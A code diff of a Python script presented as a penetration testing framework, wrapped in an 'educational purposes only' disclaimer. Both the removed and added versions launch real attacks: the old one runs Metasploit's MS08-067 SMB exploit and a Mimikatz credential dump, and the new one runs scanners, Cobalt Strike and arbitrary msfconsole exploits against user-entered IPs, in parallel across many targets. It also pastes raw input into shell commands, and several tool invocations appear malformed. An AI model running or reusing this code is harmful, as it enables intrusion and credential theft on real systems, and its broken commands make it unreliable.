@@ -10,170 +10,170 @@
 # WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
 ######################################################################################################################################################################################################################
 
-import json
-import requests
-import time
-import os
 import subprocess
+import threading
+import os
+import json
 
-# MITRE ATT&CK data URL (latest JSON dataset)
-ATTACK_DATA_URL = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
+# DISCLAIMER: This script is intended for educational purposes only. You must have explicit permission to test the target systems.
+print("DISCLAIMER: This script is intended for educational purposes only. You must have explicit permission to test the target systems.")
 
-# Disclaimer and Ethical Guidelines
-def display_disclaimer():
-    print("""
-    DISCLAIMER:
-    This script is intended for educational purposes only. It is not intended to cause any harm or damage.
-    You must have explicit permission from the owner of any system you target with this script.
-    Unauthorised testing and exploitation of systems is illegal and unethical.
-    Always ensure you have written consent before conducting any security testing.
-    """)
+# Load MITRE ATT&CK framework (you can update this URL or load a local file with tactics and techniques)
+mitre_url = "https://raw.githubusercontent.com/mitre/cti/master/enterprise-attack/enterprise-attack.json"
 
-# Load MITRE ATT&CK data
-def download_attack_data():
-    response = requests.get(ATTACK_DATA_URL)
-    if response.status_code == 200:
-        with open('attack_data.json', 'w') as f:
-            f.write(response.text)
-        print("[INFO] MITRE ATT&CK data downloaded successfully.")
-    else:
-        print("[ERROR] Failed to download MITRE ATT&CK data.")
-        return None
-    return 'attack_data.json'
+# Fetch and load MITRE ATT&CK data
+def load_mitre_data():
+    print("[INFO] Loading MITRE ATT&CK framework data...")
+    response = subprocess.run(["curl", "-s", mitre_url], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    data = response.stdout.decode()
+    mitre_data = json.loads(data)
+    return mitre_data
 
-# Load the APT group and technique data from the ATT&CK JSON file
-def load_attack_data(filename='attack_data.json'):
-    with open(filename, 'r') as f:
-        data = json.load(f)
-    return data
+mitre_data = load_mitre_data()
 
-# Display available APT groups from the ATT&CK data
-def display_apt_groups(data):
-    apt_groups = [group['name'] for group in data['objects'] if group['type'] == 'intrusion-set']
-    print("Select an APT Group:")
-    for i, group in enumerate(apt_groups, 1):
-        print(f"{i}. {group}")
-    return apt_groups
+# Function to run Nessus scan
+def run_nessus_scan(target_ip):
+    print(f"[INFO] Running Nessus scan against {target_ip}...")
+    nessus_command = f"nessus -T html -q -p 8834 -i {target_ip}"
+    result = subprocess.run(nessus_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output = result.stdout.decode() + "\n" + result.stderr.decode()
+    print(f"[INFO] Nessus scan output:\n{output}")
+    return output
 
-# Display techniques for the selected APT group
-def display_techniques(data, selected_group):
-    techniques = []
-    for obj in data['objects']:
-        if obj['type'] == 'attack-pattern' and 'kill_chain_phases' in obj:
-            for phase in obj['kill_chain_phases']:
-                if phase['phase_name'] == selected_group:
-                    techniques.append(obj['name'])
-    print("\nSelect Techniques to simulate:")
-    for i, technique in enumerate(techniques, 1):
-        print(f"{i}. {technique}")
-    return techniques
+# Function to run OpenVAS scan
+def run_openvas_scan(target_ip):
+    print(f"[INFO] Running OpenVAS scan against {target_ip}...")
+    openvas_command = f"openvas -T html -p {target_ip}"
+    result = subprocess.run(openvas_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output = result.stdout.decode() + "\n" + result.stderr.decode()
+    print(f"[INFO] OpenVAS scan output:\n{output}")
+    return output
 
-# Simulate the selected techniques (simulation mode)
-def simulate_technique(technique):
-    print(f"[INFO] Simulating {technique}...")
-    time.sleep(2)  # Simulate execution time
-    print(f"[INFO] Simulation for {technique} complete.\n")
+# Function to run Nikto scan
+def run_nikto_scan(target_ip):
+    print(f"[INFO] Running Nikto scan against {target_ip}...")
+    nikto_command = f"nikto -h {target_ip}"
+    result = subprocess.run(nikto_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output = result.stdout.decode() + "\n" + result.stderr.decode()
+    print(f"[INFO] Nikto scan output:\n{output}")
+    return output
 
-# Generate text report for the simulated techniques
-def generate_text_report(apt_group, techniques):
-    with open(f"{apt_group}_report.txt", 'w') as report_file:
-        report_file.write(f"APT Group: {apt_group}\n\n")
-        for technique in techniques:
-            report_file.write(f"- {technique}\n")
-    print(f"[INFO] Report generated: {apt_group}_report.txt")
+# Function to run Cobalt Strike (assuming it's installed)
+def run_cobalt_strike(target_ip):
+    print(f"[INFO] Running Cobalt Strike against {target_ip}...")
+    cobalt_strike_command = f"cobaltstrike -T {target_ip}"
+    result = subprocess.run(cobalt_strike_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output = result.stdout.decode() + "\n" + result.stderr.decode()
+    print(f"[INFO] Cobalt Strike output:\n{output}")
+    return output
 
-# Generate HTML report for the simulated techniques
-def generate_html_report(apt_group, techniques):
-    with open(f"{apt_group}_report.html", 'w') as report_file:
-        report_file.write(f"<html><body><h1>APT Group: {apt_group}</h1><ul>\n")
-        for technique in techniques:
-            report_file.write(f"<li>{technique}</li>\n")
-        report_file.write("</ul></body></html>")
-    print(f"[INFO] Report generated: {apt_group}_report.html")
-
-# Perform real-world penetration testing (based on techniques and selected APT group)
-def perform_real_attack(apt_group, techniques):
-    print(f"[INFO] Performing real-world attacks for APT Group: {apt_group}...")
-    for technique in techniques:
-        print(f"[INFO] Executing attack for technique: {technique}")
-        # Logic to exploit techniques
-        if "Spearphishing" in technique:
-            # Simulate a spearphishing attack (this would require an actual implementation for phishing)
-            print("[INFO] Simulating spearphishing attack.")
-        elif "Exploitation of Vulnerability" in technique:
-            # Exploit a vulnerability (e.g., MS08-067 for SMB)
-            print("[INFO] Running Metasploit for MS08-067 SMB exploit.")
-            run_metasploit_exploit('windows/smb/ms08_067_netapi', 'RHOST', '<target_ip>')
-        elif "Credential Dumping" in technique:
-            # Use Mimikatz to dump credentials
-            print("[INFO] Running Mimikatz for credential dumping.")
-            run_mimikatz()
-        else:
-            print(f"[INFO] No specific action for technique: {technique}")
-
-# Running Metasploit Exploit
-def run_metasploit_exploit(exploit_name, option_name, option_value):
-    try:
-        print(f"[INFO] Running Metasploit exploit: {exploit_name}")
-        msf_command = f"msfconsole -x 'use {exploit_name}; set {option_name} {option_value}; run'"
-        subprocess.run(msf_command, shell=True, check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"[ERROR] Error running Metasploit: {e}")
-
-# Running Mimikatz for Credential Dumping
-def run_mimikatz():
-    try:
-        print("[INFO] Running Mimikatz...")
-        mimikatz_command = "mimikatz.exe 'privilege::debug' 'sekurlsa::logonPasswords full'"
-        subprocess.run(mimikatz_command, shell=True, check=True)
-    except subprocess.CalledProcessError as e:
-        print(f"[ERROR] Error running Mimikatz: {e}")
-
-# Main function to run the attack simulation or real attack
-def run_attack():
-    # Display disclaimer
-    display_disclaimer()
-
-    # Check if ATT&CK data exists or download it
-    if not os.path.exists('attack_data.json'):
-        print("[INFO] ATT&CK data not found. Downloading...")
-        download_attack_data()
-    data = load_attack_data()  # Load the ATT&CK dataset
-
-    # Display available APT groups and let user select
-    apt_groups = display_apt_groups(data)
-    apt_group_selection = int(input(f"\nEnter selection (1-{len(apt_groups)}): "))
-    selected_group = apt_groups[apt_group_selection - 1]
-    print(f"[INFO] You selected: {selected_group}")
-
-    # Display techniques for the selected APT group
-    techniques = display_techniques(data, selected_group)
-    selected_techniques = []
-    while True:
-        technique_selection = int(input(f"\nSelect a technique (1-{len(techniques)}), or 0 to finish: "))
-        if technique_selection == 0:
-            break
-        selected_technique = techniques[technique_selection - 1]
-        selected_techniques.append(selected_technique)
-
-    # Ask for simulation or real attack mode
-    mode = input("Select mode (simulation/real): ").strip().lower()
-    if mode == 'simulation':
-        # Simulate techniques and generate reports
-        for technique in selected_techniques:
-            simulate_technique(technique)
-        report_format = input("Generate report in text or HTML format? (text/html): ").lower()
-        if report_format == 'text':
-            generate_text_report(selected_group, selected_techniques)
-        elif report_format == 'html':
-            generate_html_report(selected_group, selected_techniques)
-        else:
-            print("[ERROR] Invalid report format.")
-    elif mode == 'real':
-        # Perform real-world penetration testing
-        perform_real_attack(selected_group, selected_techniques)
+# Function to choose between simulation and real attacks
+def select_attack_mode():
+    print("[INFO] Choose attack mode:")
+    print("1. Simulation Mode (Educational, Safe)")
+    print("2. Real World Penetration Testing Mode (Requires Consent)")
+    mode = input("Enter choice (1/2): ")
+    
+    if mode == "1":
+        print("[INFO] Running in Simulation Mode...")
+        run_simulation()  # Function to simulate educational attack
+    elif mode == "2":
+        print("[INFO] Running in Penetration Testing Mode...")
+        run_penetration_test()  # Function for real exploitation
     else:
         print("[ERROR] Invalid mode selected.")
 
+# Function to simulate educational attack (Simulation Mode)
+def run_simulation():
+    print("[INFO] Running simulation mode... (no real exploitation will occur)")
+
+# Function to handle penetration testing actions (Real Attack Mode)
+def run_penetration_test():
+    target_ip = input("[INFO] Enter the target IP: ")
+    
+    print("[INFO] Select scanning tool to use:")
+    print("1. Nessus")
+    print("2. OpenVAS")
+    print("3. Nikto")
+    print("4. Cobalt Strike")
+    scan_choice = input("Enter choice (1-4): ")
+
+    if scan_choice == "1":
+        run_nessus_scan(target_ip)
+    elif scan_choice == "2":
+        run_openvas_scan(target_ip)
+    elif scan_choice == "3":
+        run_nikto_scan(target_ip)
+    elif scan_choice == "4":
+        run_cobalt_strike(target_ip)
+    else:
+        print("[ERROR] Invalid choice. Proceeding without scan.")
+    
+    print("[INFO] Select exploit tool to use:")
+    print("1. Metasploit (e.g., MS08-067)")
+    print("2. Custom Exploit")
+    exploit_choice = input("Enter choice (1-2): ")
+
+    if exploit_choice == "1":
+        exploit_name = "exploit/windows/smb/ms08_067_netapi"
+        select_and_run_exploit(target_ip, exploit_name)
+    elif exploit_choice == "2":
+        print("[INFO] Custom Exploit selected.")
+        exploit_name = input("[INFO] Enter the exploit name: ")
+        select_and_run_exploit(target_ip, exploit_name)
+    else:
+        print("[ERROR] Invalid choice. No exploit run.")
+
+# Function to select and run the appropriate exploit
+def select_and_run_exploit(target_ip, exploit_name):
+    print(f"[INFO] Selecting exploit {exploit_name} for {target_ip}...")
+    msf_command = f"msfconsole -x 'use {exploit_name}; set RHOST {target_ip}; run'"
+    result = subprocess.run(msf_command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+    output = result.stdout.decode() + "\n" + result.stderr.decode()
+    print(f"[INFO] Exploit output:\n{output}")
+    return output
+
+# Multi-target scan handler (scan and exploit multiple systems in parallel)
+def scan_and_exploit_multiple_targets(targets):
+    threads = []
+    for target in targets:
+        thread = threading.Thread(target=process_target, args=(target,))
+        threads.append(thread)
+        thread.start()
+    
+    for thread in threads:
+        thread.join()
+
+# Function to process each target
+def process_target(target_ip):
+    run_penetration_test()  # This will invoke scan and exploit
+
+# Fetch and match vulnerabilities to MITRE ATT&CK framework
+def match_vulnerabilities_to_mitre(vulnerabilities):
+    for vuln in vulnerabilities:
+        print(f"[INFO] Matching {vuln} to MITRE ATT&CK tactics...")
+        for technique in mitre_data['objects']:
+            if technique.get("type") == "attack-pattern" and technique.get("name").lower() in vuln.lower():
+                print(f"[INFO] Match found: {technique['name']}")
+
+# Main menu to start the process
+def main():
+    print("Welcome to the Penetration Testing Framework")
+    
+    while True:
+        print("\nSelect an option:")
+        print("1. Start Penetration Test")
+        print("2. Exit")
+        choice = input("Enter your choice: ")
+        
+        if choice == "1":
+            select_attack_mode()
+        elif choice == "2":
+            print("[INFO] Exiting the framework.")
+            break
+        else:
+            print("[ERROR] Invalid choice. Please try again.")
+
+# Run the main function
 if __name__ == "__main__":
-    run_attack()
+    main()
